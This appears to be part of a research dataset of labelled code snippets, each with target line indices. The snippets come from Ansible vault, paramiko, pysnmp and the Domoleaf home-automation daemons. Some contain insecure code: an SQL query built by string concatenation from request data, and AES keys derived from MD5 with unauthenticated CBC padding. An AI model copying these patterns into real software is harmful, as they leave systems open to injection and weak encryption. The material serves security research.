      "        out_file = BytesIO()\n",
      "\n",
      "        bs = AES.block_size\n",
      "        salt = in_file.read(bs)[len('Salted__'):]\n",
      "        key, iv = self.aes_derive_key_and_iv(password, salt, key_length, bs)\n",
      "        cipher = AES.new(key, AES.MODE_CBC, iv)\n",
      "        next_chunk = ''\n",
      "        finished = False\n",
      "\n",
      "        while not finished:\n",
      "            chunk, next_chunk = next_chunk, cipher.decrypt(in_file.read(1024 * bs))\n",
      "            if len(next_chunk) == 0:\n",
      "                padding_length = ord(chunk[-1])\n",
      "                chunk = chunk[:-padding_length]\n",
      "                finished = True\n",
      "            out_file.write(chunk)\n",
      "\n",
      "        # reset the stream pointer to the beginning\n",
      "        out_file.seek(0)\n",
      "        new_data = out_file.read()\n",
      "\n",
      "        # split out sha and verify decryption\n",
      "        split_data = new_data.split(\"\\n\")\n",
      "        this_sha = split_data[0]\n",
      "        this_data = '\\n'.join(split_data[1:])\n",
      "        test_sha = sha256(this_data).hexdigest()\n",
      "\n",
      "        if this_sha != test_sha:\n",
      "            raise errors.AnsibleError(\"Decryption failed\")\n",
      "\n",
      "        #return out_file.read()\n",
      "        return this_data\n",
      "\n",
      "\n",
      "class VaultAES256(object):\n",
      "\n",
      "    \"\"\"\n",
      "    Vault implementation using AES-CTR with an HMAC-SHA256 authentication code. \n",
      "    Keys are derived using PBKDF2\n",
      "    \"\"\"\n",
      "\n",
      "    # http://www.daemonology.net/blog/2009-06-11-cryptographic-right-answers.html\n",
      "\n",
      "    def __init__(self):\n",
      "\n",
      "        if not HAS_PBKDF2 or not HAS_COUNTER or not HAS_HASH:\n",
      "            raise errors.AnsibleError(CRYPTO_UPGRADE)\n"
    ],
    "target": 36,
    "len": 3
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/spirrello/spirrello-pynet-work/applied_python/lib/python2.7/site-packages/ansible/utils/vault.py",
    "code": [
      "        hash_function = SHA256\n",
      "\n",
      "        # make two keys and one iv\n",
      "        pbkdf2_prf = lambda p, s: HMAC.new(p, s, hash_function).digest()\n",
      "\n",
      "\n",
      "        derivedkey = PBKDF2(password, salt, dkLen=(2 * keylength) + ivlength, \n",
      "                            count=10000, prf=pbkdf2_prf)\n",
      "\n",
      "        key1 = derivedkey[:keylength]\n",
      "        key2 = derivedkey[keylength:(keylength * 2)]\n",
      "        iv = derivedkey[(keylength * 2):(keylength * 2) + ivlength]\n",
      "\n",
      "        return key1, key2, hexlify(iv)\n",
      "\n",
      "\n",
      "    def encrypt(self, data, password):\n",
      "\n",
      "        salt = os.urandom(32)\n",
      "        key1, key2, iv = self.gen_key_initctr(password, salt)\n",
      "\n",
      "        # PKCS#7 PAD DATA http://tools.ietf.org/html/rfc5652#section-6.3\n",
      "        bs = AES.block_size\n",
      "        padding_length = (bs - len(data) % bs) or bs\n",
      "        data += padding_length * chr(padding_length)\n",
      "\n",
      "        # COUNTER.new PARAMETERS\n",
      "        # 1) nbits (integer) - Length of the counter, in bits.\n",
      "        # 2) initial_value (integer) - initial value of the counter. \"iv\" from gen_key_initctr\n",
      "\n",
      "        ctr = Counter.new(128, initial_value=long(iv, 16))\n",
      "\n",
      "        # AES.new PARAMETERS\n",
      "        # 1) AES key, must be either 16, 24, or 32 bytes long -- \"key\" from gen_key_initctr\n",
      "        # 2) MODE_CTR, is the recommended mode\n",
      "        # 3) counter=<CounterObject>\n",
      "\n",
      "        cipher = AES.new(key1, AES.MODE_CTR, counter=ctr)\n",
      "\n",
      "        # ENCRYPT PADDED DATA\n",
      "        cryptedData = cipher.encrypt(data)                \n",
      "\n",
      "        # COMBINE SALT, DIGEST AND DATA\n",
      "        hmac = HMAC.new(key2, cryptedData, SHA256)\n",
      "        message = \"%s\\n%s\\n%s\" % ( hexlify(salt), hmac.hexdigest(), hexlify(cryptedData) )\n",
      "        message = hexlify(message)\n",
      "        return message\n",
      "\n",
      "    def decrypt(self, data, password):\n",
      "\n",
      "        # SPLIT SALT, DIGEST, AND DATA\n",
      "        data = ''.join(data.split(\"\\n\"))\n",
      "        data = unhexlify(data)\n",
      "        salt, cryptedHmac, cryptedData = data.split(\"\\n\", 2)\n",
      "        salt = unhexlify(salt)\n",
      "        cryptedData = unhexlify(cryptedData)\n",
      "\n",
      "        key1, key2, iv = self.gen_key_initctr(password, salt)\n",
      "\n",
      "        # EXIT EARLY IF DIGEST DOESN'T MATCH \n",
      "        hmacDecrypt = HMAC.new(key2, cryptedData, SHA256)\n",
      "        if not self.is_equal(cryptedHmac, hmacDecrypt.hexdigest()):\n",
      "            return None\n",
      "\n",
      "        # SET THE COUNTER AND THE CIPHER\n",
      "        ctr = Counter.new(128, initial_value=long(iv, 16))\n",
      "        cipher = AES.new(key1, AES.MODE_CTR, counter=ctr)\n",
      "\n",
      "        # DECRYPT PADDED DATA\n",
      "        decryptedData = cipher.decrypt(cryptedData)\n",
      "\n",
      "        # UNPAD DATA\n",
      "        padding_length = ord(decryptedData[-1])\n",
      "        decryptedData = decryptedData[:-padding_length]\n",
      "\n",
      "        return decryptedData\n",
      "\n",
      "    def is_equal(self, a, b):\n",
      "        # http://codahale.com/a-lesson-in-timing-attacks/\n"
    ],
    "target": 36,
    "len": 3
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/spirrello/spirrello-pynet-work/applied_python/lib/python2.7/site-packages/ansible/utils/vault.py",
    "code": [
      "\n",
      "        key1 = derivedkey[:keylength]\n",
      "        key2 = derivedkey[keylength:(keylength * 2)]\n",
      "        iv = derivedkey[(keylength * 2):(keylength * 2) + ivlength]\n",
      "\n",
      "        return key1, key2, hexlify(iv)\n",
      "\n",
      "\n",
      "    def encrypt(self, data, password):\n",
      "\n",
      "        salt = os.urandom(32)\n",
      "        key1, key2, iv = self.gen_key_initctr(password, salt)\n",
      "\n",
      "        # PKCS#7 PAD DATA http://tools.ietf.org/html/rfc5652#section-6.3\n",
      "        bs = AES.block_size\n",
      "        padding_length = (bs - len(data) % bs) or bs\n",
      "        data += padding_length * chr(padding_length)\n",
      "\n",
      "        # COUNTER.new PARAMETERS\n",
      "        # 1) nbits (integer) - Length of the counter, in bits.\n",
      "        # 2) initial_value (integer) - initial value of the counter. \"iv\" from gen_key_initctr\n",
      "\n",
      "        ctr = Counter.new(128, initial_value=long(iv, 16))\n",
      "\n",
      "        # AES.new PARAMETERS\n",
      "        # 1) AES key, must be either 16, 24, or 32 bytes long -- \"key\" from gen_key_initctr\n",
      "        # 2) MODE_CTR, is the recommended mode\n",
      "        # 3) counter=<CounterObject>\n",
      "\n",
      "        cipher = AES.new(key1, AES.MODE_CTR, counter=ctr)\n",
      "\n",
      "        # ENCRYPT PADDED DATA\n",
      "        cryptedData = cipher.encrypt(data)                \n",
      "\n",
      "        # COMBINE SALT, DIGEST AND DATA\n",
      "        hmac = HMAC.new(key2, cryptedData, SHA256)\n",
      "        message = \"%s\\n%s\\n%s\" % ( hexlify(salt), hmac.hexdigest(), hexlify(cryptedData) )\n",
      "        message = hexlify(message)\n",
      "        return message\n",
      "\n",
      "    def decrypt(self, data, password):\n",
      "\n",
      "        # SPLIT SALT, DIGEST, AND DATA\n",
      "        data = ''.join(data.split(\"\\n\"))\n",
      "        data = unhexlify(data)\n",
      "        salt, cryptedHmac, cryptedData = data.split(\"\\n\", 2)\n",
      "        salt = unhexlify(salt)\n",
      "        cryptedData = unhexlify(cryptedData)\n",
      "\n",
      "        key1, key2, iv = self.gen_key_initctr(password, salt)\n",
      "\n",
      "        # EXIT EARLY IF DIGEST DOESN'T MATCH \n",
      "        hmacDecrypt = HMAC.new(key2, cryptedData, SHA256)\n",
      "        if not self.is_equal(cryptedHmac, hmacDecrypt.hexdigest()):\n",
      "            return None\n",
      "\n",
      "        # SET THE COUNTER AND THE CIPHER\n",
      "        ctr = Counter.new(128, initial_value=long(iv, 16))\n",
      "        cipher = AES.new(key1, AES.MODE_CTR, counter=ctr)\n",
      "\n",
      "        # DECRYPT PADDED DATA\n",
      "        decryptedData = cipher.decrypt(cryptedData)\n",
      "\n",
      "        # UNPAD DATA\n",
      "        padding_length = ord(decryptedData[-1])\n",
      "        decryptedData = decryptedData[:-padding_length]\n",
      "\n",
      "        return decryptedData\n",
      "\n",
      "    def is_equal(self, a, b):\n",
      "        # http://codahale.com/a-lesson-in-timing-attacks/\n",
      "        if len(a) != len(b):\n",
      "            return False\n",
      "        \n",
      "        result = 0\n",
      "        for x, y in zip(a, b):\n",
      "            result |= ord(x) ^ ord(y)\n",
      "        return result == 0     \n",
      "\n"
    ],
    "target": 57,
    "len": 3
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/spirrello/spirrello-pynet-work/applied_python/lib/python2.7/site-packages/paramiko/pkey.py",
    "code": [
      "#\n",
      "# This file is part of paramiko.\n",
      "#\n",
      "# Paramiko is free software; you can redistribute it and/or modify it under the\n",
      "# terms of the GNU Lesser General Public License as published by the Free\n",
      "# Software Foundation; either version 2.1 of the License, or (at your option)\n",
      "# any later version.\n",
      "#\n",
      "# Paramiko is distributed in the hope that it will be useful, but WITHOUT ANY\n",
      "# WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR\n",
      "# A PARTICULAR PURPOSE.  See the GNU Lesser General Public License for more\n",
      "# details.\n",
      "#\n",
      "# You should have received a copy of the GNU Lesser General Public License\n",
      "# along with Paramiko; if not, write to the Free Software Foundation, Inc.,\n",
      "# 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA.\n",
      "\n",
      "\"\"\"\n",
      "Common API for all public keys.\n",
      "\"\"\"\n",
      "\n",
      "import base64\n",
      "from binascii import hexlify, unhexlify\n",
      "import os\n",
      "from hashlib import md5\n",
      "\n",
      "from Crypto.Cipher import DES3, AES\n",
      "\n",
      "from paramiko import util\n",
      "from paramiko.common import o600, zero_byte\n",
      "from paramiko.py3compat import u, encodebytes, decodebytes, b\n",
      "from paramiko.ssh_exception import SSHException, PasswordRequiredException\n",
      "\n",
      "\n",
      "class PKey (object):\n",
      "    \"\"\"\n",
      "    Base class for public keys.\n",
      "    \"\"\"\n",
      "\n",
      "    # known encryption types for private key files:\n",
      "    _CIPHER_TABLE = {\n",
      "        'AES-128-CBC': {'cipher': AES, 'keysize': 16, 'blocksize': 16, 'mode': AES.MODE_CBC},\n",
      "        'DES-EDE3-CBC': {'cipher': DES3, 'keysize': 24, 'blocksize': 8, 'mode': DES3.MODE_CBC},\n",
      "    }\n",
      "\n",
      "    def __init__(self, msg=None, data=None):\n",
      "        \"\"\"\n",
      "        Create a new instance of this public key type.  If ``msg`` is given,\n",
      "        the key's public part(s) will be filled in from the message.  If\n",
      "        ``data`` is given, the key's public part(s) will be filled in from\n",
      "        the string.\n",
      "\n",
      "        :param .Message msg:\n",
      "            an optional SSH `.Message` containing a public key of this type.\n",
      "        :param str data: an optional string containing a public key of this type\n",
      "\n",
      "        :raises SSHException:\n",
      "            if a key cannot be created from the ``data`` or ``msg`` given, or\n",
      "            no key was passed in.\n",
      "        \"\"\"\n",
      "        pass\n",
      "\n",
      "    def asbytes(self):\n",
      "        \"\"\"\n",
      "        Return a string of an SSH `.Message` made up of the public part(s) of\n",
      "        this key.  This string is suitable for passing to `__init__` to\n",
      "        re-create the key object later.\n",
      "        \"\"\"\n",
      "        return bytes()\n",
      "\n",
      "    def __str__(self):\n",
      "        return self.asbytes()\n",
      "\n",
      "    # noinspection PyUnresolvedReferences\n",
      "    def __cmp__(self, other):\n",
      "        \"\"\"\n",
      "        Compare this key to another.  Returns 0 if this key is equivalent to\n",
      "        the given key, or non-0 if they are different.  Only the public parts\n",
      "        of the key are compared, so a public key will compare equal to its\n",
      "        corresponding private key.\n",
      "\n",
      "        :param .Pkey other: key to compare to.\n",
      "        \"\"\"\n"
    ],
    "target": 40,
    "len": 3
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/spirrello/spirrello-pynet-work/applied_python/lib/python2.7/site-packages/pysnmp/proto/secmod/rfc3826/priv/aes.py",
    "code": [
      "              snmpEngineTime>>16&0xff,\n",
      "              snmpEngineTime>>8&0xff,\n",
      "              snmpEngineTime&0xff] + salt\n",
      "\n",
      "        return privKey[:self.keySize].asOctets(), univ.OctetString(iv).asOctets()\n",
      "\n",
      "    def hashPassphrase(self, authProtocol, privKey):\n",
      "        if authProtocol == hmacmd5.HmacMd5.serviceID:\n",
      "            return localkey.hashPassphraseMD5(privKey)\n",
      "        elif authProtocol == hmacsha.HmacSha.serviceID:\n",
      "            return localkey.hashPassphraseSHA(privKey)\n",
      "        else:\n",
      "            raise error.ProtocolError(\n",
      "                'Unknown auth protocol %s' % (authProtocol,)\n",
      "            )\n",
      "\n",
      "    def localizeKey(self, authProtocol, privKey, snmpEngineID):\n",
      "        if authProtocol == hmacmd5.HmacMd5.serviceID:\n",
      "            localPrivKey = localkey.localizeKeyMD5(privKey, snmpEngineID)\n",
      "        elif authProtocol == hmacsha.HmacSha.serviceID:\n",
      "            localPrivKey = localkey.localizeKeySHA(privKey, snmpEngineID)\n",
      "        else:\n",
      "            raise error.ProtocolError(\n",
      "                'Unknown auth protocol %s' % (authProtocol,)\n",
      "            )\n",
      "        return localPrivKey[:16]\n",
      "\n",
      "    # 3.2.4.1\n",
      "    def encryptData(self, encryptKey, privParameters, dataToEncrypt):\n",
      "        if AES is None:\n",
      "            raise error.StatusInformation(\n",
      "                errorIndication=errind.encryptionError\n",
      "            )\n",
      "\n",
      "        snmpEngineBoots, snmpEngineTime, salt = privParameters\n",
      "\n",
      "        # 3.3.1.1\n",
      "        aesKey, iv, salt = self.__getEncryptionKey(\n",
      "            encryptKey, snmpEngineBoots, snmpEngineTime\n",
      "        )\n",
      "\n",
      "        # 3.3.1.3\n",
      "        aesObj = AES.new(aesKey, AES.MODE_CFB, iv, segment_size=128)\n",
      "\n",
      "        # PyCrypto seems to require padding\n",
      "        dataToEncrypt = dataToEncrypt + univ.OctetString((0,) * (16-len(dataToEncrypt)%16)).asOctets()\n",
      "\n",
      "        ciphertext = aesObj.encrypt(dataToEncrypt)\n",
      "\n",
      "        # 3.3.1.4\n",
      "        return univ.OctetString(ciphertext), univ.OctetString(salt)\n",
      "\n",
      "    # 3.2.4.2\n",
      "    def decryptData(self, decryptKey, privParameters, encryptedData):\n",
      "        if AES is None:\n",
      "            raise error.StatusInformation(\n",
      "                errorIndication=errind.decryptionError\n",
      "            )\n",
      "\n",
      "        snmpEngineBoots, snmpEngineTime, salt = privParameters\n",
      "\n",
      "        # 3.3.2.1\n",
      "        if len(salt) != 8:\n",
      "            raise error.StatusInformation(\n",
      "                errorIndication=errind.decryptionError\n",
      "            )\n",
      "\n",
      "        # 3.3.2.3\n",
      "        aesKey, iv = self.__getDecryptionKey(\n",
      "            decryptKey, snmpEngineBoots, snmpEngineTime, salt\n",
      "        )\n",
      "\n",
      "        aesObj = AES.new(aesKey, AES.MODE_CFB, iv, segment_size=128)\n",
      "\n",
      "        # PyCrypto seems to require padding\n",
      "        encryptedData = encryptedData + univ.OctetString((0,) * (16-len(encryptedData)%16)).asOctets()\n",
      "\n",
      "        # 3.3.2.4-6\n",
      "        return aesObj.decrypt(encryptedData.asOctets())"
    ],
    "target": 41,
    "len": 3
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/spirrello/spirrello-pynet-work/applied_python/lib/python2.7/site-packages/pysnmp/proto/secmod/rfc3826/priv/aes.py",
    "code": [
      "              snmpEngineTime>>16&0xff,\n",
      "              snmpEngineTime>>8&0xff,\n",
      "              snmpEngineTime&0xff] + salt\n",
      "\n",
      "        return privKey[:self.keySize].asOctets(), univ.OctetString(iv).asOctets()\n",
      "\n",
      "    def hashPassphrase(self, authProtocol, privKey):\n",
      "        if authProtocol == hmacmd5.HmacMd5.serviceID:\n",
      "            return localkey.hashPassphraseMD5(privKey)\n",
      "        elif authProtocol == hmacsha.HmacSha.serviceID:\n",
      "            return localkey.hashPassphraseSHA(privKey)\n",
      "        else:\n",
      "            raise error.ProtocolError(\n",
      "                'Unknown auth protocol %s' % (authProtocol,)\n",
      "            )\n",
      "\n",
      "    def localizeKey(self, authProtocol, privKey, snmpEngineID):\n",
      "        if authProtocol == hmacmd5.HmacMd5.serviceID:\n",
      "            localPrivKey = localkey.localizeKeyMD5(privKey, snmpEngineID)\n",
      "        elif authProtocol == hmacsha.HmacSha.serviceID:\n",
      "            localPrivKey = localkey.localizeKeySHA(privKey, snmpEngineID)\n",
      "        else:\n",
      "            raise error.ProtocolError(\n",
      "                'Unknown auth protocol %s' % (authProtocol,)\n",
      "            )\n",
      "        return localPrivKey[:16]\n",
      "\n",
      "    # 3.2.4.1\n",
      "    def encryptData(self, encryptKey, privParameters, dataToEncrypt):\n",
      "        if AES is None:\n",
      "            raise error.StatusInformation(\n",
      "                errorIndication=errind.encryptionError\n",
      "            )\n",
      "\n",
      "        snmpEngineBoots, snmpEngineTime, salt = privParameters\n",
      "\n",
      "        # 3.3.1.1\n",
      "        aesKey, iv, salt = self.__getEncryptionKey(\n",
      "            encryptKey, snmpEngineBoots, snmpEngineTime\n",
      "        )\n",
      "\n",
      "        # 3.3.1.3\n",
      "        aesObj = AES.new(aesKey, AES.MODE_CFB, iv, segment_size=128)\n",
      "\n",
      "        # PyCrypto seems to require padding\n",
      "        dataToEncrypt = dataToEncrypt + univ.OctetString((0,) * (16-len(dataToEncrypt)%16)).asOctets()\n",
      "\n",
      "        ciphertext = aesObj.encrypt(dataToEncrypt)\n",
      "\n",
      "        # 3.3.1.4\n",
      "        return univ.OctetString(ciphertext), univ.OctetString(salt)\n",
      "\n",
      "    # 3.2.4.2\n",
      "    def decryptData(self, decryptKey, privParameters, encryptedData):\n",
      "        if AES is None:\n",
      "            raise error.StatusInformation(\n",
      "                errorIndication=errind.decryptionError\n",
      "            )\n",
      "\n",
      "        snmpEngineBoots, snmpEngineTime, salt = privParameters\n",
      "\n",
      "        # 3.3.2.1\n",
      "        if len(salt) != 8:\n",
      "            raise error.StatusInformation(\n",
      "                errorIndication=errind.decryptionError\n",
      "            )\n",
      "\n",
      "        # 3.3.2.3\n",
      "        aesKey, iv = self.__getDecryptionKey(\n",
      "            decryptKey, snmpEngineBoots, snmpEngineTime, salt\n",
      "        )\n",
      "\n",
      "        aesObj = AES.new(aesKey, AES.MODE_CFB, iv, segment_size=128)\n",
      "\n",
      "        # PyCrypto seems to require padding\n",
      "        encryptedData = encryptedData + univ.OctetString((0,) * (16-len(encryptedData)%16)).asOctets()\n",
      "\n",
      "        # 3.3.2.4-6\n",
      "        return aesObj.decrypt(encryptedData.asOctets())"
    ],
    "target": 71,
    "len": 3
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/taccons/Domoleaf/domomaster/usr/bin/domomaster/KNXManager.py",
    "code": [
      "        self.sql = MasterSql();\n",
      "        self._parser = DaemonConfigParser('/etc/domoleaf/master.conf');\n",
      "        self.aes_slave_keys = slave_keys;\n",
      "\n",
      "    def update_room_device_option(self, daemon_id, json_obj):\n",
      "        \"\"\"\n",
      "        Update room_device_option table in database to set new values of the device described by 'json_obj'\n",
      "        \"\"\"\n",
      "        if int(json_obj['type']) == KNX_RESPONSE:\n",
      "            self.sql.update_room_device_option_resp(json_obj, daemon_id);\n",
      "        elif int(json_obj['type']) == KNX_WRITE_SHORT:\n",
      "            self.sql.update_room_device_option_write_short(json_obj, daemon_id);\n",
      "        elif int(json_obj['type']) == KNX_WRITE_LONG:\n",
      "            self.sql.update_room_device_option_write_long(json_obj, daemon_id);\n",
      "\n",
      "    def protocol_knx(self, json_obj, dev, hostname):\n",
      "        \"\"\"\n",
      "        KNX protocol data treatment function\n",
      "        \"\"\"\n",
      "        new_obj = {\n",
      "            \"data\": {\n",
      "                \"addr\": str(dev['addr_dst']),\n",
      "                \"value\": str(json_obj['data']['value']),\n",
      "                \"option_id\": str(json_obj['data']['option_id']),\n",
      "                \"room_device_id\": str(dev['room_device_id']),\n",
      "            }\n",
      "        };\n",
      "        self.knx_function[int(json_obj['data']['option_id'])](hostname, new_obj);\n",
      "\n",
      "    def send_json_obj_to_slave(self, json_str, sock, hostname, aes_key, close_flag = True):\n",
      "        \"\"\"\n",
      "        Send 'json_obj' to 'hostname' via 'sock'\n",
      "        \"\"\"\n",
      "        hostname_key = '';\n",
      "        if '.' in hostname:\n",
      "            hostname_key = hostname.split('.')[0];\n",
      "        else:\n",
      "            hostname_key = hostname;\n",
      "        AES.key_size = 32;\n",
      "        aes_IV = AESManager.get_IV();\n",
      "        encode_obj = AES.new(aes_key, AES.MODE_CBC, aes_IV);\n",
      "        spaces = 16 - len(json_str) % 16;\n",
      "        data2 = encode_obj.encrypt(json_str + (spaces * ' '));\n",
      "        sock.send(bytes(aes_IV, 'utf-8') + data2);\n",
      "        if close_flag == True:\n",
      "            sock.close();\n",
      "\n",
      "    def send_knx_write_speed_fan(self, hostname, json_obj):\n",
      "        \"\"\"\n",
      "        Ask to close all the speed fan before open another\n",
      "        \"\"\"\n",
      "        port = self._parser.getValueFromSection('connect', 'port');\n",
      "        if not port:\n",
      "            sys.exit(4);\n",
      "        if json_obj['data']['value'] == '1':\n",
      "            query =  'SELECT option_id, addr, dpt_id ';\n",
      "            query += 'FROM room_device_option ';\n",
      "            query += 'WHERE room_device_id=' + str(json_obj['data']['room_device_id']) + ' AND ';\n",
      "            query += 'option_id IN(400, 401, 402, 403, 404, 405, 406) AND status=1';\n",
      "            res = self.sql.mysql_handler_personnal_query(query);\n",
      "            for line in res:\n",
      "                if str(line[2]) == \"51\" and str(line[0]) == str(json_obj['data']['option_id']):\n",
      "                    sock = socket.create_connection((hostname, port));\n",
      "                    val = str(line[0]).split('40')[1];\n",
      "                    json_str = json.JSONEncoder().encode(\n",
      "                        {\n",
      "                            \"packet_type\": \"knx_write_long\",\n",
      "                            \"addr_to_send\": line[1],\n",
      "                            \"value\": val\n",
      "                        }\n",
      "                    );\n",
      "                    self.send_json_obj_to_slave(json_str, sock, hostname, self.aes_slave_keys[hostname]);\n",
      "                    sock.close();\n",
      "                    return;\n",
      "                if str(line[2]) == \"2\" and str(line[0]) != str(json_obj['data']['option_id']):\n",
      "                    sock = socket.create_connection((hostname, port));\n",
      "                    json_str = json.JSONEncoder().encode(\n",
      "                        {\n",
      "                            \"packet_type\": \"knx_write_short\",\n",
      "                            \"addr_to_send\": line[1],\n",
      "                            \"value\": \"0\"\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/taccons/Domoleaf/domoslave/usr/bin/domoslave/SlaveDaemon.py",
    "code": [
      "        self._hostlist = self._scanner._HostList;\n",
      "        self._parser = DaemonConfigParser(SLAVE_CONF_FILE);\n",
      "        self.encrypt_keys = {};\n",
      "        self.knx_sock = None;\n",
      "        self.master_sock = None;\n",
      "        self.enocean_sock = None;\n",
      "        self.cron_sock = None;\n",
      "        self.private_aes = hashlib.md5(self._parser.getValueFromSection('personnal_key', 'aes').encode()).hexdigest();\n",
      "        self.wifi_init(self._parser.getValueFromSection('wifi', 'ssid'), self._parser.getValueFromSection('wifi', 'password'), self._parser.getValueFromSection('wifi', 'encryption'), self._parser.getValueFromSection('wifi', 'mode'), 0);\n",
      "        self.functions = {\n",
      "            KNX_READ_REQUEST    : self.knx_read_request,\n",
      "            KNX_WRITE_SHORT     : self.knx_write_short,\n",
      "            KNX_WRITE_LONG      : self.knx_write_long,\n",
      "            KNX_WRITE_TEMP      : self.knx_write_temp,\n",
      "            CHECK_SLAVE         : self.check_slave,\n",
      "            MONITOR_IP          : self.monitor_ip,\n",
      "            DATA_UPDATE         : self.update,\n",
      "            SEND_TECH           : self.send_tech,\n",
      "            SEND_ALIVE          : self.send_alive,\n",
      "            SEND_INTERFACES     : self.send_interfaces,\n",
      "            SHUTDOWN_D3         : self.shutdown_d3,\n",
      "            REBOOT_D3           : self.reboot_d3,\n",
      "            WIFI_UPDATE         : self.wifi_update\n",
      "        };\n",
      "\n",
      "    def update(self, json_obj, connection):\n",
      "        call(['apt-get', 'update']);\n",
      "        call(['DEBIAN_FRONTEND=noninteractive', 'apt-get', 'install', 'domoslave', '-y']);\n",
      "        version_file = open('/etc/domoleaf/.domoslave.version', 'r');\n",
      "        if not version_file:\n",
      "            self.logger.error('/etc/domoleaf/.domoslave.version: no such file or directory');\n",
      "            print('/etc/domoleaf/.domoslave.version: no such file or directory');\n",
      "            return;\n",
      "        version = version_file.read();\n",
      "        if '\\n' in version:\n",
      "            version = version.split('\\n')[0];\n",
      "        json_str = '{\"packet_type\": \"update_finished\", \"aes_pass\": \"' + self.private_aes + '\", \"new_version\": ' + version + '}'\n",
      "        encrypt_IV = AESManager.get_IV();\n",
      "        spaces = 16 - len(json_str) % 16;\n",
      "        json_str = json_str + (spaces * ' ')\n",
      "        encode_obj = AES.new(self.private_aes, AES.MODE_CBC, encrypt_IV);\n",
      "        data = encode_obj.encrypt(json_str);\n",
      "        # faut ouvrir une nouvelle socket pour envoyer la nouvelle version\n",
      "        # connection.send(bytes(encrypt_IV, 'utf-8') + data);\n",
      "\n",
      "    def run(self):\n",
      "        \"\"\"\n",
      "        Initialization of the sockets for listenning incomming connections.\n",
      "        Calls the loop function.\n",
      "        \"\"\"\n",
      "        self.run = True;\n",
      "        \n",
      "        self.knx_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM);\n",
      "        self.master_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM);\n",
      "        self.enocean_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM);\n",
      "        self.cron_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM);\n",
      "        \n",
      "        port = self._parser.getValueFromSection(SLAVE_CONF_KNX_SECTION, SLAVE_CONF_KNX_PORT_ENTRY);\n",
      "        if not port:\n",
      "            sys.exit(2);\n",
      "        port_master = self._parser.getValueFromSection(SLAVE_CONF_LISTEN_SECTION, SLAVE_CONF_LISTEN_PORT_ENTRY);\n",
      "        if not port_master:\n",
      "            sys.exit(2);\n",
      "        port_enocean = self._parser.getValueFromSection(SLAVE_CONF_ENOCEAN_SECTION, SLAVE_CONF_ENOCEAN_PORT_ENTRY);\n",
      "        if not port_enocean:\n",
      "            sys.exit(2);\n",
      "        port_cron = self._parser.getValueFromSection(SLAVE_CONF_CRON_SECTION, SLAVE_CONF_CRON_PORT_ENTRY);\n",
      "        if not port_cron:\n",
      "            sys.exit(2);\n",
      "        \n",
      "        self.knx_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1);\n",
      "        self.master_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1);\n",
      "        self.enocean_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1);\n",
      "        self.cron_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1);\n",
      "        \n",
      "        self.knx_sock.bind(('', int(port)));\n",
      "        self.master_sock.bind(('', int(port_master)));\n",
      "        self.enocean_sock.bind(('', int(port_enocean)));\n",
      "        self.cron_sock.bind(('127.0.0.1', int(port_cron)));\n",
      "        \n",
      "        self.knx_sock.listen(MAX_KNX);\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/taccons/Domoleaf/domoslave/usr/bin/domoslave/SlaveDaemon.py",
    "code": [
      "        json_obj = json.JSONDecoder().decode(data);\n",
      "        print(json_obj);\n",
      "        if json_obj['packet_type'] in self.functions.keys():\n",
      "            self.functions[json_obj['packet_type']](json_obj, connection);\n",
      "        else:\n",
      "            raise Exception(str(json_obj['packet_type']) + \": is not a valid packet type\");\n",
      "\n",
      "    def knx_read_request(self, json_obj, connection):\n",
      "        \"\"\"\n",
      "        System call of \"groupread\" with parameters.\n",
      "        \"\"\"\n",
      "        call(['knxtool', CALL_GROUPREAD, EIB_URL, json_obj['addr_to_read']]);\n",
      "\n",
      "    def knx_write_temp(self, json_obj, connection):\n",
      "        \"\"\"\n",
      "        System call of \"groupwrite\" with parameters.\n",
      "        Almost the same as \"knx_write_long\" function, except that parameters are not the same\n",
      "        \"\"\"\n",
      "        val = json_obj['value'].split(' ')\n",
      "        call(['knxtool', CALL_GROUPWRITE, EIB_URL, json_obj['addr_to_send'], val[0], val[1]]);\n",
      "\n",
      "    def knx_write_short(self, json_obj, connection):\n",
      "        \"\"\"\n",
      "        System call of \"groupswrite\" with parameters.\n",
      "        \"\"\"\n",
      "        call(['knxtool', CALL_GROUPSWRITE, EIB_URL, json_obj['addr_to_send'], str(json_obj['value'])]);\n",
      "\n",
      "    def knx_write_long(self, json_obj, connection):\n",
      "        \"\"\"\n",
      "        System call of \"groupwrite\" with parameters.\n",
      "        \"\"\"\n",
      "        call(['knxtool', CALL_GROUPWRITE, EIB_URL, json_obj['addr_to_send'], str(json_obj['value'])]);\n",
      "\n",
      "    def receive_from_masters(self, masters_to_read):\n",
      "        \"\"\"\n",
      "        Read data comming from masters and call \"parse_data\" function.\n",
      "        \"\"\"\n",
      "        for master in masters_to_read:\n",
      "            data = master.recv(4096);\n",
      "            decrypt_IV = data[:16].decode();\n",
      "            decode_obj = AES.new(self.private_aes, AES.MODE_CBC, decrypt_IV);\n",
      "            data2 = decode_obj.decrypt(data[16:]);\n",
      "            self.parse_data(data2.decode(), master);\n",
      "\n",
      "    def receive_from_knx(self, knx_to_read):\n",
      "        \"\"\"\n",
      "        Read data from monitor KNX and transmits to master.\n",
      "        \"\"\"\n",
      "        for knx in knx_to_read:\n",
      "            data = knx.recv(TELEGRAM_LENGTH);\n",
      "            if data:\n",
      "                self.send_knx_data_to_masters(data);\n",
      "            else:\n",
      "                if knx in self.connected_knx:\n",
